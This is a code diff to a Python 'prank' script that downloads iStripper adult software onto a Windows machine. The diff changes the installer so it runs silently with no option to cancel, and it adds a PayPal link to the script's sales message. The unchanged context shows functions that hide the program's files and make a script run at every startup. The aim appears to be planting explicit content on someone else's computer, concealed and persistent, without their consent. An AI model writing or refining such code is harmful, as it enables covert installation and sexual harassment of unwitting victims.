@@ -1,5 +1,3 @@
-from pywinauto.keyboard import send_keys
-from pywinauto.application import Application
 import os
 import time
 import winreg
@@ -9,6 +7,7 @@ import ctypes
 import tkinter as tk
 from tkinter import messagebox
 import subprocess
+import webbrowser
 import shutil
 
 url = 'https://www.istripper.com/fileaccess/software'
@@ -41,24 +40,9 @@ def download_software(url, filename):
 
 
 def install_software(filename):
-    print("Please do not disturb anything the installation may interrupt...")
-    Application().start(cmd_line=filename)
-    time.sleep(3)
-    send_keys('{ENTER}')
-    time.sleep(3)
-    send_keys('{ENTER}')
-    time.sleep(3)
-    send_keys('{ENTER}')
-    time.sleep(20)
-    send_keys('{ENTER}')
-    time.sleep(9)
-    send_keys('{ENTER}')
-    time.sleep(5)
-    send_keys('{ENTER}')
-    time.sleep(2)
-    send_keys('%{F4}')
-    time.sleep(10)
-    send_keys('%{F4}')
+    print("Installing the software silently")
+    subprocess.run(["istripper.exe", "/VerySilent", "/NOCANCEL"], check=True)
+    time.sleep(3)  # just for confirmation
 
 
 def hide_all_vghd_files(dir):
@@ -163,3 +147,5 @@ if __name__ == "__main__":
     r.run_script_at_startup_istripper(
         vbs_loc=vbs, vbs_startup_loc=vbs_startup, dst_loc=di)
     print("done everything thanks for using the software !!! this is only for prank and there is a premium version in which the girls do full strip tease naked, this software only for 5$ to buy contact me on discord")
+
+    webbrowser.open("https://paypal.me/furjack")
